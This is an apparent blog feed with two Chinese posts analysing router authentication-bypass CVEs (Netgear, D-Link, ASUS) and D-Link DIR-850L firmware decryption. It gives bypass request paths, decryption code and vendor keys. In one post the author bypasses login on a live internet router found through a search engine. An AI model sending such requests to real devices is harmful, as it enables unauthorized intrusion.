<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p1Kk&#39;s World!</title>
  
  <subtitle>艺无止境，功不唐捐。</subtitle>
  <link href="atom.xml" rel="self"/>
  
  <link href="p1Kk.github.io/"/>
  <updated>2021-11-30T09:18:57.849Z</updated>
  <id>p1Kk.github.io/</id>
  
  <author>
    <name>p1Kk</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>多个认证绕过漏洞分析</title>
    <link href="p1Kk.github.io/2021/11/30/iot/multiple_auth_bypass_vuln_analysis/"/>
    <id>p1Kk.github.io/2021/11/30/iot/multiple_auth_bypass_vuln_analysis/</id>
    <published>2021-11-29T16:00:00.000Z</published>
    <updated>2021-11-30T09:18:57.849Z</updated>
    
    <content type="html"><![CDATA[<p>之前只针对了CVE-2019-17137进行了分析，后文新增其他绕过漏洞</p><h1 id="CVE-2019-17137"><a href="#CVE-2019-17137" class="headerlink" title="CVE-2019-17137"></a>CVE-2019-17137</h1><blockquote><p>此漏洞允许网络邻近攻击者绕过受影响的NETGEAR AC1200 R6220固件版本1.1.0.86（及之前）智能WiFi路由器安装的认证。利用此漏洞不需要身份验证。特定的缺陷存在于路径字符串的处理过程中。通过在路径中插入一个null字节，用户可以跳过大多数身份验证检查。攻击者可以利用这个漏洞绕过系统上的身份验证。</p></blockquote><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><ul><li><p>固件下载地址<br>v1.1.0.86(漏洞版本): <a href="https://www.netgear.com/support/product/R6220.aspx#Firmware%20Version%201.1.0.86" target="_blank" rel="noopener">https://www.netgear.com/support/product/R6220.aspx#Firmware%20Version%201.1.0.86</a></p><p>v1.1.0.100(补丁版本): <a href="https://www.netgear.com/support/product/R6220.aspx#Firmware%20Version%201.1.0.100" target="_blank" rel="noopener">https://www.netgear.com/support/product/R6220.aspx#Firmware%20Version%201.1.0.100</a></p></li><li><p>漏洞位置：<code>/usr/sbin/mini_httpd</code></p></li><li><p>这个漏洞本身比较简单，主要是通过该漏洞学习一下<strong>补丁对比、工具</strong>【bindiff、burpsuite】</p></li></ul><h2 id="0x02-bindiff比较"><a href="#0x02-bindiff比较" class="headerlink" title="0x02 bindiff比较"></a>0x02 bindiff比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Call Graph-----------------------两个文件的函数调用图</span><br><span class="line">Matched Functions----------------两个文件的函数匹配度</span><br><span class="line">Primary Unmatched Functions------主要不匹配函数</span><br><span class="line">Secondary Unmatched Functions----次要不匹配函数</span><br></pre></td></tr></table></figure><p>主要查看这几个没有函数名的函数</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/bindiff86vs100.png" alt></p><p>有的函数比较庞大，根据函数漏洞，是因为路径字符串处理问题，所以可以在ida字符串列表里搜索一下htm之类的后缀，然后查看引用，在版本100中找到在函数<code>sub_00409774</code>中，所以直接查看这里的函数比较</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/86100%E8%A1%A5%E4%B8%81.png" alt></p><p>在<code>0x0040B4A0 vs 0x0040B758</code>找到了可疑变量<code>a00</code></p><p>解读一下新的补丁</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/%E8%A7%A3%E8%AF%BB%E8%A1%A5%E4%B8%81.png" alt></p><p>而在漏洞版本中，并没有对00进行检测，如果遇到00就会产生截断</p><p>比如发送<code>/index.htm%00currentsetting.htm</code>，函数就会检测uri，在.data中存放着无需认证就可以访问的页面，检测到uri中存在这样的页面，就开始进行URL解码，存在%00产生截断，即访问的是index.htm，由于程序已经认为不需要认证，所以可以直接访问。</p><p>(netgear还存在直接拼接currentsetting.htm进行绕过的问题，如通过<code>/aaa.cgi?todo=debug&amp;x=currentsetting.htm</code>进行绕过)</p><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>固件模拟有点麻烦…使用fofa搜索关键字<code>&quot;R6200&quot;</code></p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/fofa6200.png" alt></p><p>访问该网站，index.htm需要账号密码才能访问。</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/R6200index401.png" alt></p><p>然后查看currentsetting.htm 版本信息页面，可以直接访问，发现该路由器版本为34，属于漏洞版本。</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/R6200current.png" alt></p><p>通过burp抓包，修改uri，达到直接访问index.htm的认证绕过。</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/R6200index200.png" alt></p><h1 id="CVE-2019-17373"><a href="#CVE-2019-17373" class="headerlink" title="CVE-2019-17373"></a>CVE-2019-17373</h1><blockquote><p>netgear</p></blockquote><p>可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://target/*.htm?x=1.jpg</span><br><span class="line">or</span><br><span class="line">http://target/*.cgi?A=a&amp;B=b&amp;...&amp;x=1.jpg</span><br></pre></td></tr></table></figure><p>进行绕过，主要是因为程序逻辑匹配<code>.jpg</code>等字符串</p><h1 id="PSV-2021-0133"><a href="#PSV-2021-0133" class="headerlink" title="PSV-2021-0133"></a>PSV-2021-0133</h1><blockquote><p>NETGEAR 认证绕过：<a href="https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/</a></p></blockquote><p><code>mini_httpd</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LAB_000104f8:</span><br><span class="line">DAT_0001d4ec_needs_auth = <span class="number">0</span>;</span><br><span class="line">DAT_0001f24c = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">pcVar4 = (<span class="keyword">char</span> *)FUN_0000b8f0(<span class="number">1</span>);</span><br><span class="line">iVar3 = strcasecmp(pcVar5,pcVar4);</span><br><span class="line"><span class="keyword">if</span> ((iVar3 == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">(pcVar6 = <span class="built_in">strstr</span>(DAT_0001f330,<span class="string">"todo=PNPX_GetShareFolderList"</span>), pcVar6 != (<span class="keyword">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">DAT_0001d4ec_needs_auth = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它检查请求行是否包含<code>todo=PNPX_GetShareFolderList</code>，如果包含，则将变量设置<code>DAT_0001d4ec</code>为 0。似乎该变量（我已将其重命名为<code>_needs_auth</code>）用于检查访问请求的资源是否需要身份验证。如果设置为 0，则无需用户名和密码即可提供资源。</p><p>由于它使用strstr来检查，所以字符串需要出现在原始请求行中，但没有检查请求行是否包含其他内容。</p><p>这意味着我们可以在 Web 服务器上请求任何无需身份验证的文件，包括配置文件和披露管理用户密码的网页。</p><h1 id="CVE-2020-8864"><a href="#CVE-2020-8864" class="headerlink" title="CVE-2020-8864"></a>CVE-2020-8864</h1><blockquote><p>D-Link DIR-882、DIR-878 和 DIR-867路由器</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130165129657.png" alt="image-20211130165129657"></p><p><code>login_result_424090</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210903104142396.png" alt="image-20210903104142396"></p><h1 id="CVE-2020-8863"><a href="#CVE-2020-8863" class="headerlink" title="CVE-2020-8863"></a>CVE-2020-8863</h1><blockquote><p>D-Link DIR-882、DIR-878 和 DIR-867路由器：认证绕过、后门</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210903110342507.png" alt="image-20210903110342507"></p><h1 id="CVE-2020-15633"><a href="#CVE-2020-15633" class="headerlink" title="CVE-2020-15633"></a>CVE-2020-15633</h1><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210903112743060.png" alt="image-20210903112743060"></p><p>Getcaptchasett</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210903112857644.png" alt="image-20210903112857644"></p><p>在<code>main</code>函数中可以看出，56位是REQUEST_URI，因此，请求url中包含Getcaptchasett列表中的uri即可实现绕过</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130165814696.png" alt="image-20211130165814696"></p><h1 id="CVE-2021-35973"><a href="#CVE-2021-35973" class="headerlink" title="CVE-2021-35973"></a>CVE-2021-35973</h1><blockquote><p>WAC104  version&lt;v1.0.4.15中，%00问题</p></blockquote><p>目标文件：<code>/usr/sbin/mini_httpd</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130171757281.png" alt="image-20211130171757281"></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130171816418.png" alt="image-20211130171816418"></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130171837116.png" alt="image-20211130171837116"></p><p>对/ . ..和特殊字符进行了检验，但没有检验%00</p><h1 id="CVE-2021-32030"><a href="#CVE-2021-32030" class="headerlink" title="CVE-2021-32030"></a>CVE-2021-32030</h1><blockquote><p>ASUS RT-AX56U路由器身份验证绕过</p></blockquote><p>目标文件：<code>/usr/sbin/httpd</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210819000010058.png" alt="image-20210819000010058"></p><p>在设备的默认配置下，IFTTT 功能没有开启， ifttt_token 默认为空</p><p>如果用户传入的 asus_token 也是空值，则 strcmp 会返回 0 表示比较成功，这样就能绕过后续的检查，实现身份验证绕过。</p><h1 id="CVE-2021-20090"><a href="#CVE-2021-20090" class="headerlink" title="CVE-2021-20090"></a>CVE-2021-20090</h1><blockquote><p>ASUS DCS-AC88U</p></blockquote><p>目标文件：<code>/usr/sbin/httpd</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210820094933867.png" alt="image-20210820094933867"></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210820095318853.png" alt="image-20210820095318853"></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210820101158404.png" alt="image-20210820101158404"></p><p><code>process_post</code> -&gt; … -&gt;<code>sub_167A8</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210820100601882.png" alt="image-20210820100601882"></p><p>把 ../ 后的url放到开头，因此如果请求<code>/images/../aaa.cgi</code>  ==&gt; <code>/aaa.cgi</code>即可绕过</p><blockquote><p>reference</p><p><a href="https://www.anquanke.com/post/id/227623" target="_blank" rel="noopener">https://www.anquanke.com/post/id/227623</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前只针对了CVE-2019-17137进行了分析，后文新增其他绕过漏洞&lt;/p&gt;
&lt;h1 id=&quot;CVE-2019-17137&quot;&gt;&lt;a href=&quot;#CVE-2019-17137&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-17137&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="漏洞复现" scheme="p1Kk.github.io/categories/漏洞复现/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="路由器" scheme="p1Kk.github.io/tags/路由器/"/>
    
    <category term="cve" scheme="p1Kk.github.io/tags/cve/"/>
    
    <category term="认证绕过" scheme="p1Kk.github.io/tags/认证绕过/"/>
    
  </entry>
  
  <entry>
    <title>Dlink DIR-850L 固件加解密</title>
    <link href="p1Kk.github.io/2021/06/18/iot/Dlink%20DIR-850L%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
    <id>p1Kk.github.io/2021/06/18/iot/Dlink%20DIR-850L%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%A7%A3%E5%AF%86/</id>
    <published>2021-06-17T16:00:00.000Z</published>
    <updated>2021-08-29T15:29:13.521Z</updated>
    
    <content type="html"><![CDATA[<p>固件下载地址：<a href="http://files.dlink.com.au/Products/DIR-850L/REV_B/Firmware/Firmware_v2.20b03/DIR850LB1_FW220WWb03.bin" target="_blank" rel="noopener">http://files.dlink.com.au/Products/DIR-850L/REV_B/Firmware/Firmware_v2.20b03/DIR850LB1_FW220WWb03.bin</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW220WWb03.bin </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>binwalk并没有分析出什么东西，这可能是一个加密文件。我们需要用到binwalk的<code>-E</code>参数，查看该固件的<strong>熵</strong>。计算熵是一种感知给定字节序列是否压缩或加密的有效手段。<strong>熵值大，意味着有可能是加密的或是压缩过的。熵值低，则正好相反。</strong>不过，即使得到具体的熵值，也并不是总能立刻得到准确的判断。</p><h1 id="解密old-version"><a href="#解密old-version" class="headerlink" title="解密old version"></a>解密old version</h1><p>在<a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html中可以学到：" target="_blank" rel="noopener">https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html中可以学到：</a></p><p>DIR850LA1_FW114WWb07.bin是没有被加密的，直接解压后，后面版本的加密key <code>wrgac05_dlob.hans_dir850l</code> 就存在于固件系统目录下的<code>/etc/config</code>的<code>fw_sign</code>或<code>image_sign</code>中，一般来说同一型号不同版本的路由器的key都是一样的。利用文中的解密方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Simple tool to decrypt D-LINK DIR-850L REVB firmwares </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ gcc -o revbdec revbdec.c</span></span><br><span class="line"><span class="comment"> * $ ./revbdec DIR850L_REVB_FW207WWb05_h1ke_beta1.bin wrgac25_dlink.2013gui_dir850l &gt; DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USAGE <span class="meta-string">"Usage: decimg &lt;filename&gt; &lt;key&gt;\n"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span>    argc,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">char</span>   **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>     i, fi;</span><br><span class="line">        <span class="keyword">int</span>     fo = STDOUT_FILENO, fe = STDERR_FILENO;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                write(fe, USAGE, <span class="built_in">strlen</span>(USAGE));</span><br><span class="line">                <span class="keyword">return</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((fi = open(argv[<span class="number">1</span>], O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">"open"</span>);</span><br><span class="line">                write(fe, USAGE, <span class="built_in">strlen</span>(USAGE));</span><br><span class="line">                <span class="keyword">return</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *key = argv[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> kl = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">                <span class="keyword">int</span> j, len;</span><br><span class="line">                len = read(fi, buffer, <span class="number">4096</span>);</span><br><span class="line">                <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                        buffer[j] ^= (i + j) % <span class="number">0xFB</span> + <span class="number">1</span>;</span><br><span class="line">                        buffer[j] ^= key[(i + j) % kl];</span><br><span class="line">                &#125;</span><br><span class="line">                write(fo, buffer, len);</span><br><span class="line">                i += len;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> (EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后进行尝试解密原文测试的固件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./revbdec DIR850LB1_FW207WWb05.bin wrgac05_dlob.hans_dir850l &gt; DIR850LB1_FW207WWb05.decrypted</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW207WWb05.decrypted </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>失败，这是为什么？因为我找到的key和原文中的key<code>wrgac25_dlink.2013gui_dir850l</code>并不相同，看来同一个型号的固件key也会不同</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./revbdec DIR850LB1_FW207WWb05.bin wrgac25_dlink.2013gui_dir850l &gt; DIR850LB1_FW207WWb05.decrypted</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW207WWb05.decrypted </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/1"</span><br><span class="line">10380         0x288C          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5184868 bytes</span><br><span class="line">1704052       0x1A0074        PackImg section delimiter tag, little endian size: 10517760 bytes; big endian size: 8232960 bytes</span><br><span class="line">1704084       0x1A0094        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8231815 bytes, 2677 inodes, blocksize: 131072 bytes, created: 2016-03-29 04:08:14</span><br></pre></td></tr></table></figure><p>对DIR850LB1_FW207WWb05.bin测试成功，再测试FW220</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 两个key我都已经尝试</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./revbdec DIR850LB1_FW220WWb03.bin wrgac05_dlob.hans_dir850l &gt; DIR850LB1_FW220WWb03.decrypted</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW220WWb03.decrypted </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>失败，可能是由于固件的加密方式已改变</p><p>固件一般有这么几种加密方式：</p><ol><li>设备固件出厂时未加密，也不包含任何解密例程。解密例程与固件的未加密版本一起以更高版本（v1.1）一起提供，以用于将来的加密固件更新，随后的固件版本将被加密。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/encrypt1.jpg" alt="1"></p><ol start="2"><li>设备固件在原始发行版中已加密，供应商决定更改加密方案，并发布包含新解密例程的未加密过渡版本v1.2。阅读固件版本的<em>发行说明</em>可能有助于识别未加密的过渡版本。发行说明通常会指导用户在升级到最新版本之前先升级到中间版本，中间版本很可能是未加密的过渡固件。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/encrypt2.jpg" alt></p><ol start="3"><li>设备固件在原始版本中是加密的。但是，供应商决定更改加密方案，并发布包含新解密例程的未加密过渡版本。在这种情况下，来获得解密例程就很困难了。一种方法是购买设备并直接从硬件中提取未加密的固件。另一种可能的方法是对固件进行更多的分析，以期“破解加密”。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/encrypt3.jpg" alt></p><h1 id="解密new-version"><a href="#解密new-version" class="headerlink" title="解密new version"></a>解密new version</h1><p>通过分析DIR850L B1系列的路由器，发现DIR850LB1_FW210WWb03.bin没有被加密，所以应该就是上述的加密方式2，新的解密方式应该就保存在FW210中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW210WWb03.bin </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/1"</span><br><span class="line">10380         0x288C          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes</span><br><span class="line">209586        0x332B2         Nagra Constant_KEY IDEA_Key: 10192431 B9CB4D0F BA90B26E</span><br><span class="line">1704052       0x1A0074        PackImg section delimiter tag, little endian size: 13664256 bytes; big endian size: 8441856 bytes</span><br><span class="line">1704084       0x1A0094        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8441157 bytes, 2692 inodes, blocksize: 131072 bytes, created: 2017-09-18 12:11:33</span><br></pre></td></tr></table></figure><p>在ida中查找加密关键字<code>crypt</code>发现了关键函数<code>encrypt_main</code>-&gt;<code>sub_4090E0</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/dir850l_stringencry.png" alt="crypt"></p><p>还可以注意到，在<code>encrypt_main</code>调用的<code>sub_408F8C</code>中，似乎是对文件进行encode decode处理的函数</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/dir805lencimg.png" alt></p><p>而在我们的固件系统文件中存在<code>/usr/sbin/encimg</code>，尝试运行一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mips-static usr/sbin/encimg</span></span><br><span class="line">no signature specified!</span><br><span class="line">Usage: encimg &#123;OPTIONS&#125;</span><br><span class="line">   -h                      : show this message.</span><br><span class="line">   -v                      : Verbose mode.</span><br><span class="line">   -i &#123;input image file&#125;   : input image file.</span><br><span class="line">   -e                      : encode file.</span><br><span class="line">   -d                      : decode file.</span><br><span class="line">   -s                      : signature.</span><br><span class="line"><span class="meta">#</span><span class="bash"> input文件使用绝对路径相对路径都找不到文件，最后还是把文件贴到了squashfs-root根目录下</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mips-static --strace usr/sbin/encimg -i DIR850LB1_FW220WWb03.bin -d -s wrgac25_dlink.2013gui_dir850l </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解密成功！</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW220WWb03.bin </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/1"</span><br><span class="line">10380         0x288C          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes</span><br><span class="line">209586        0x332B2         Nagra Constant_KEY IDEA_Key: 10192431 B9CB4D0F BA90B26E</span><br><span class="line">1704052       0x1A0074        PackImg section delimiter tag, little endian size: 13664256 bytes; big endian size: 8441856 bytes</span><br><span class="line">1704084       0x1A0094        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8441027 bytes, 2692 inodes, blocksize: 131072 bytes, created: 2017-09-18 12:21:21</span><br></pre></td></tr></table></figure><h1 id="恶意更新固件"><a href="#恶意更新固件" class="headerlink" title="恶意更新固件"></a>恶意更新固件</h1><p>对固件恶意修改后进行打包再加密，升级后获取shell</p><h1 id="IOT-Auditor"><a href="#IOT-Auditor" class="headerlink" title="IOT Auditor"></a><a href="https://app.expliot.io/" target="_blank" rel="noopener">IOT Auditor</a></h1><ol><li><p>熵图对比</p></li><li><p>分析Linux文件系统并下载所有内容</p></li><li><p>反编译的代码和函数</p></li><li><p><a href="https://expliot.io/pages/firmware-auditor" target="_blank" rel="noopener">https://expliot.io/pages/firmware-auditor</a></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/dir850l_iotauditor.png" alt></p><blockquote><p>reference:</p><p><a href="https://cq674350529.github.io/2019/03/18/D-Link-DIR-850L%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E6%9E%90%E4%B9%8B%E8%8E%B7%E5%8F%96%E8%AE%BE%E5%A4%87shell/" target="_blank" rel="noopener">https://cq674350529.github.io/2019/03/18/D-Link-DIR-850L%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E6%9E%90%E4%B9%8B%E8%8E%B7%E5%8F%96%E8%AE%BE%E5%A4%87shell/</a></p><p><a href="https://mp.weixin.qq.com/s/CpT4gTAwYMCFqwTRxQBBkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CpT4gTAwYMCFqwTRxQBBkw</a></p><p><a href="https://www.4hou.com/posts/wZpJ" target="_blank" rel="noopener">https://www.4hou.com/posts/wZpJ</a></p></blockquote><h1 id="后续"><a href="#后续" class="headerlink" 